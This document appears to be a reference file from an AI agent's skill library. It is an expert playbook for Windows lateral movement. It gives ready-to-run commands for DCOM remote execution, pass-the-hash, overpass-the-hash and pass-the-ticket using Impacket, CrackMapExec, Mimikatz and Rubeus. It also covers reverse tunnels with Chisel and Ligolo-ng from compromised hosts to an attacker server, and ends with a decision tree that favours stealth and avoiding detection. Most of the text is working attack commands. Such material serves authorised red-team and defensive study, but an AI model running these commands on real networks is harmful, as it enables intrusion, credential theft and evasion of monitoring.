# SKILL: Windows Lateral Movement — Expert Attack Playbook: detailed technique reference

<!-- zhiyugo:resource:start -->
> ZhiyuGo reference material only. Inspect it explicitly through catalog resource tooling when the main Skill names this file; examples do not grant tools, authorization, or evidence.
<!-- zhiyugo:resource:end -->

<!-- zhiyugo:toc:start -->
## Contents

- [5. DCOM LATERAL MOVEMENT](#5-dcom-lateral-movement)
- [6. PASS-THE-HASH (PTH)](#6-pass-the-hash-pth)
- [7. OVERPASS-THE-HASH (PASS-THE-KEY)](#7-overpass-the-hash-pass-the-key)
- [8. PASS-THE-TICKET](#8-pass-the-ticket)
- [9. PIVOTING THROUGH COMPROMISED HOSTS](#9-pivoting-through-compromised-hosts)
- [10. LATERAL MOVEMENT DECISION TREE](#10-lateral-movement-decision-tree)
<!-- zhiyugo:toc:end -->

## 5. DCOM LATERAL MOVEMENT

Stealthy — uses legitimate COM objects, no service creation.

### MMC20.Application

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\temp\out.txt","7")
```

### ShellWindows

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","TARGET"))
$item = $com.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c whoami > C:\temp\out.txt","C:\Windows\System32",$null,0)
```

### ShellBrowserWindow

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","TARGET"))
$com.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)
```

### Impacket dcomexec

```bash
dcomexec.py DOMAIN/administrator:password@TARGET_IP
dcomexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP -object MMC20
```

---

## 6. PASS-THE-HASH (PTH)

Use NTLM hash directly without knowing the plaintext password.

```bash
# CrackMapExec — spray/check admin access
crackmapexec smb TARGETS -u administrator -H NTLM_HASH

# Impacket tools (all support -hashes)
psexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET
wmiexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET
smbexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET

# evil-winrm
evil-winrm -i TARGET -u user -H NTLM_HASH

# xfreerdp (Restricted Admin mode must be enabled)
xfreerdp /v:TARGET /u:administrator /pth:NTLM_HASH /d:DOMAIN
```

```cmd
# Mimikatz PTH (spawns new process with injected creds)
sekurlsa::pth /user:administrator /domain:DOMAIN /ntlm:HASH /run:cmd.exe
```

### Enable Restricted Admin for RDP PTH

```cmd
# On target (requires admin): enable restricted admin
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

---

## 7. OVERPASS-THE-HASH (PASS-THE-KEY)

Convert NTLM hash → Kerberos TGT → pure Kerberos authentication.

```bash
# Request TGT with hash
getTGT.py DOMAIN/user -hashes :NTLM_HASH -dc-ip DC_IP
export KRB5CCNAME=user.ccache

# Or with AES256 key
getTGT.py DOMAIN/user -aesKey AES256_KEY -dc-ip DC_IP

# Use Kerberos for all subsequent tools
psexec.py -k -no-pass DOMAIN/user@target.domain.com
wmiexec.py -k -no-pass DOMAIN/user@target.domain.com
```

```cmd
# Mimikatz overpass-the-hash
sekurlsa::pth /user:user /domain:DOMAIN /ntlm:HASH /run:powershell.exe
# New PowerShell session → klist shows Kerberos TGT
```

**Advantage**: Pure Kerberos auth avoids NTLM logging and detection.

---

## 8. PASS-THE-TICKET

```bash
# Use existing .ccache ticket
export KRB5CCNAME=/path/to/admin.ccache
psexec.py -k -no-pass DOMAIN/admin@target.domain.com
```

```cmd
# Mimikatz — inject .kirbi ticket
kerberos::ptt ticket.kirbi
# Verify
klist

# Rubeus
Rubeus.exe ptt /ticket:base64_blob
```

---

## 9. PIVOTING THROUGH COMPROMISED HOSTS

### SSH Tunnel / Port Forward

```bash
# Dynamic SOCKS proxy through compromised host
ssh -D 1080 user@COMPROMISED_HOST
# Use with proxychains

# Local port forward (access internal service)
ssh -L 8888:INTERNAL_TARGET:445 user@COMPROMISED_HOST
```

### Chisel (No SSH Needed)

```bash
# On attacker (server)
chisel server --reverse -p 8080

# On compromised host (client)
chisel client ATTACKER:8080 R:socks
# Creates SOCKS5 proxy on attacker's port 1080
```

### Ligolo-ng (Modern, Fast)

```bash
# On attacker
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# On compromised host
ligolo-agent -connect ATTACKER:11601 -retry -ignore-cert

# In ligolo console
session          # Select agent
start            # Start tunnel
# Add route: sudo ip route add INTERNAL_SUBNET/24 dev ligolo
```

---

## 10. LATERAL MOVEMENT DECISION TREE

```
Have credentials / hash — need to move laterally
│
├── What credentials do you have?
│   ├── Plaintext password → any method
│   ├── NTLM hash → PTH methods (§6)
│   │   ├── Need stealthier? → Overpass-the-Hash first (§7)
│   │   └── Direct use → psexec/wmiexec/evil-winrm with -H
│   ├── Kerberos ticket → Pass-the-Ticket (§8)
│   └── AES key → Overpass-the-Hash with -aesKey (§7)
│
├── OPSEC priority?
│   ├── High stealth needed
│   │   ├── WMI (no file on disk, no service) → wmiexec (§3)
│   │   ├── DCOM (uses legitimate COM) → dcomexec (§5)
│   │   └── WinRM (PowerShell remoting) → evil-winrm (§4)
│   ├── Moderate stealth
│   │   ├── smbexec (no binary upload) (§2)
│   │   └── atexec (scheduled task, auto-cleanup) (§2)
│   └── Low stealth acceptable
│       ├── PsExec (reliable, creates service) (§2)
│       └── RDP (interactive GUI) (§6)
│
├── Need to pivot to internal network?
│   ├── SSH available → SSH tunnel / SOCKS (§9)
│   ├── No SSH → Chisel or Ligolo-ng (§9)
│   └── Multiple hops → chain SOCKS proxies
│
├── Target hardening?
│   ├── SMB signing required → WMI, WinRM, or DCOM
│   ├── WinRM disabled → WMI or DCOM
│   ├── Firewall blocks 135/445 → RDP or SSH
│   └── Restricted Admin disabled → no RDP PTH → use other methods
│
└── Need to dump creds on new host?
    └── Load CREDENTIAL_DUMPING.md
```
